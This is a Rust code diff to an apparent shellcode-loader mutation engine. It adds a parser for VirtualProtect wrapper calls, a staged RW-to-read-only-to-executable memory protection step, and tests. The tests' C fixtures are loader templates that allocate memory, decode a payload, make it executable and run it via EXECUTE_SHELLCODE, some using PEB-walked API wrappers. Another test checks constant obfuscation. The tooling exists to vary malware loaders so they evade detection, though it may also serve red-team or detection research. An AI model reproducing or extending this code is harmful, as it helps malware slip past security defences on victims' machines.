@@ -636,8 +636,24 @@ impl AstMutator {
             }
             "rw_r_rx" => {
                 // Insert intermediate R protection before the RX step
-                let staged = format!("{indent}VirtualProtect(buf, PAYLOAD_LEN, 0x02, &old_prot);");
-                out.insert(vp_idx, staged);
+                match parse_vp_call(lines[vp_idx]) {
+                    Some(parts) => {
+                        let staged = format!(
+                            "{indent}{}({}, {}, p_R, {});",
+                            parts.func_name, parts.args[0], parts.args[1], parts.args[3],
+                        );
+                        out.insert(vp_idx, staged);
+                    }
+                    None => {
+                        warn!(
+                            "protection_transition: could not parse VirtualProtect at line {}, using fallback",
+                            vp_idx + 1
+                        );
+                        let staged =
+                            format!("{indent}VirtualProtect(buf, PAYLOAD_LEN, p_R, &old_prot);");
+                        out.insert(vp_idx, staged);
+                    }
+                }
             }
             _ => {
                 warn!(
@@ -862,6 +878,56 @@ fn is_inside_obf_declaration(node: tree_sitter::Node, source: &[u8]) -> bool {
     false
 }
 
+/// Parsed components of a VirtualProtect-like call.
+struct VpCallParts {
+    func_name: String,
+    args: Vec<String>,
+}
+
+/// Parse a VirtualProtect-like call from a source line.
+///
+/// Handles all wrapper patterns: `VirtualProtect(...)`, `MyVirtualProtect(...)`,
+/// `myVirtualProtect(...)`. Walks backwards from "VirtualProtect" to capture
+/// any prefix, then extracts the 4 arguments.
+fn parse_vp_call(line: &str) -> Option<VpCallParts> {
+    let vp_pos = line.find("VirtualProtect")?;
+    // Walk backwards for full function name (My*, my*, etc.)
+    let line_bytes = line.as_bytes();
+    let mut func_start = vp_pos;
+    while func_start > 0 && is_word_char(line_bytes[func_start - 1]) {
+        func_start -= 1;
+    }
+    // Find opening paren after "VirtualProtect"
+    let after_name = vp_pos + "VirtualProtect".len();
+    let open = line[after_name..].find('(').map(|i| i + after_name)?;
+    let func_name = line[func_start..open].to_string();
+    // Find matching close paren (handles nested parens)
+    let mut depth = 0i32;
+    let mut close = None;
+    for (i, ch) in line[open..].char_indices() {
+        match ch {
+            '(' => depth += 1,
+            ')' => {
+                depth -= 1;
+                if depth == 0 {
+                    close = Some(open + i);
+                    break;
+                }
+            }
+            _ => {}
+        }
+    }
+    let close = close?;
+    let args: Vec<String> = line[open + 1..close]
+        .split(',')
+        .map(|s| s.trim().to_string())
+        .collect();
+    if args.len() != 4 {
+        return None;
+    }
+    Some(VpCallParts { func_name, args })
+}
+
 /// Walk ancestors to find the node whose parent is a `compound_statement`.
 /// Returns `None` for file/global scope.
 fn find_containing_statement(node: tree_sitter::Node) -> Option<tree_sitter::Node> {
@@ -880,7 +946,7 @@ fn find_containing_statement(node: tree_sitter::Node) -> Option<tree_sitter::Nod
 
 /// Known protection macros to inline before const obfuscation.
 /// Ordered longest-first so `p_RWX` is processed before `p_RW`.
-const PROTECTION_MACROS: &[&str] = &["p_RWX", "p_RX", "p_RW"];
+const PROTECTION_MACROS: &[&str] = &["p_RWX", "p_RX", "p_RW", "p_R"];
 
 /// Inline protection macros so their values become number literals
 /// that const_obfuscation can process.
@@ -1250,7 +1316,11 @@ void deconditioner() {
             "Expected at least 2 VirtualProtect calls, got {}",
             vp_count
         );
-        assert!(out.contains("0x02")); // PAGE_READONLY
+        // Parsed call should produce correct intermediate step
+        assert!(
+            out.contains("VirtualProtect(buf, PAYLOAD_LEN, p_R, &old_prot);"),
+            "Should generate parsed VirtualProtect call with p_R, got:\n{out}"
+        );
     }
 
     #[test]
@@ -1716,5 +1786,154 @@ void f() {
         assert_eq!(parse_c_integer("0"), Some(0));
         assert_eq!(parse_c_integer("0b1010"), Some(10));
         assert_eq!(parse_c_integer("3.14"), None); // float
+    }
+
+    // ── parse_vp_call unit tests ──────────────────────────────────────────
+
+    #[test]
+    fn test_parse_vp_call_bare() {
+        let line = "    VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot);";
+        let parts = parse_vp_call(line).expect("should parse bare VirtualProtect");
+        assert_eq!(parts.func_name, "VirtualProtect");
+        assert_eq!(parts.args[0], "buf");
+        assert_eq!(parts.args[1], "PAYLOAD_LEN");
+        assert_eq!(parts.args[2], "p_RX");
+        assert_eq!(parts.args[3], "&old_prot");
+    }
+
+    #[test]
+    fn test_parse_vp_call_my_wrapper() {
+        let line = "    if (!MyVirtualProtect(dest, PAYLOAD_LEN, p_RX, &result)) {";
+        let parts = parse_vp_call(line).expect("should parse MyVirtualProtect");
+        assert_eq!(parts.func_name, "MyVirtualProtect");
+        assert_eq!(parts.args[0], "dest");
+        assert_eq!(parts.args[1], "PAYLOAD_LEN");
+        assert_eq!(parts.args[2], "p_RX");
+        assert_eq!(parts.args[3], "&result");
+    }
+
+    #[test]
+    fn test_parse_vp_call_peb_walker() {
+        let line = "    if (!myVirtualProtect(dest, PAYLOAD_LEN, p_RX, &old)) return 31;";
+        let parts = parse_vp_call(line).expect("should parse myVirtualProtect");
+        assert_eq!(parts.func_name, "myVirtualProtect");
+        assert_eq!(parts.args[0], "dest");
+        assert_eq!(parts.args[1], "PAYLOAD_LEN");
+        assert_eq!(parts.args[2], "p_RX");
+        assert_eq!(parts.args[3], "&old");
+    }
+
+    #[test]
+    fn test_parse_vp_call_no_match() {
+        assert!(parse_vp_call("    int x = 42;").is_none());
+        assert!(parse_vp_call("    VirtualAlloc(NULL, 4096, 0x3000, 0x04);").is_none());
+    }
+
+    // ── carrier protection_transition tests ───────────────────────────────
+
+    fn carrier_template_alloc() -> &'static str {
+        r#"#include "../header/definitions.h"
+int carrier() {
+    DWORD result;
+    char *dest = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
+    if (!dest) return 30;
+    decode_payload(dest, PAYLOAD_LEN);
+    // @MUTATE:protection_transition
+    if (!MyVirtualProtect(dest, PAYLOAD_LEN, p_RX, &result)) {
+        return 31;
+    }
+    EXECUTE_SHELLCODE(dest);
+    return 0;
+}"#
+    }
+
+    fn carrier_template_peb() -> &'static str {
+        r#"#include "../header/definitions.h"
+int carrier() {
+    char *dest = (char*)myVirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
+    if (!dest) return 30;
+    decode_payload(dest, PAYLOAD_LEN);
+    // @MUTATE:protection_transition
+    DWORD old;
+    if (!myVirtualProtect(dest, PAYLOAD_LEN, p_RX, &old)) return 31;
+    EXECUTE_SHELLCODE(dest);
+    return 0;
+}"#
+    }
+
+    #[test]
+    fn test_protection_staged_carrier_alloc() {
+        let mut ast = AstMutator::new().unwrap();
+        let spec = make_spec("ast.protection_transition", &[("pattern", "rw_r_rx")]);
+        let (out, applied) = ast.apply(carrier_template_alloc(), &[&spec]).unwrap();
+
+        assert!(applied.contains(&"ast.protection_transition".to_string()));
+        assert!(
+            out.contains("MyVirtualProtect(dest, PAYLOAD_LEN, p_R, &result);"),
+            "Should generate MyVirtualProtect with p_R, got:\n{out}"
+        );
+        // Original RX call still present
+        assert!(out.contains("MyVirtualProtect(dest, PAYLOAD_LEN, p_RX, &result)"));
+    }
+
+    #[test]
+    fn test_protection_staged_carrier_peb() {
+        let mut ast = AstMutator::new().unwrap();
+        let spec = make_spec("ast.protection_transition", &[("pattern", "rw_r_rx")]);
+        let (out, applied) = ast.apply(carrier_template_peb(), &[&spec]).unwrap();
+
+        assert!(applied.contains(&"ast.protection_transition".to_string()));
+        assert!(
+            out.contains("myVirtualProtect(dest, PAYLOAD_LEN, p_R, &old);"),
+            "Should generate myVirtualProtect with p_R, got:\n{out}"
+        );
+    }
+
+    #[test]
+    fn test_protection_rwx_carrier() {
+        let mut ast = AstMutator::new().unwrap();
+        let spec = make_spec("ast.protection_transition", &[("pattern", "rw_rwx")]);
+        let (out, applied) = ast.apply(carrier_template_alloc(), &[&spec]).unwrap();
+
+        assert!(applied.contains(&"ast.protection_transition".to_string()));
+        assert!(
+            out.contains("p_RWX"),
+            "rw_rwx should replace p_RX with p_RWX"
+        );
+        assert!(!out.contains("p_RX"), "p_RX should be replaced");
+    }
+
+    #[test]
+    fn test_const_obfuscation_after_staged_protection() {
+        let mut ast = AstMutator::new().unwrap();
+        let source = "\
+#define p_RW  0x04
+#define p_R   0x02
+#define p_RX  0x20
+#define p_RWX 0x40
+void f() {
+    char *buf = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
+    // @MUTATE:protection_transition
+    VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot);
+}";
+        let specs = [
+            make_spec("ast.protection_transition", &[("pattern", "rw_r_rx")]),
+            make_spec("ast.const_obfuscation", &[]),
+        ];
+        let spec_refs: Vec<&MutationSpec> = specs.iter().collect();
+        let (out, applied) = ast.apply(source, &spec_refs).unwrap();
+
+        assert!(applied.contains(&"ast.protection_transition".to_string()));
+        assert!(applied.contains(&"ast.const_obfuscation".to_string()));
+        // p_R (0x02) should be inlined and obfuscated — no raw p_R or 0x02
+        assert!(
+            !out.contains("p_R"),
+            "p_R should be inlined by const_obfuscation, got:\n{out}"
+        );
+        assert!(
+            !out.contains("0x02"),
+            "0x02 should be obfuscated, got:\n{out}"
+        );
+        assert!(out.contains("__obf_c"), "Should have obfuscated constants");
     }
 }
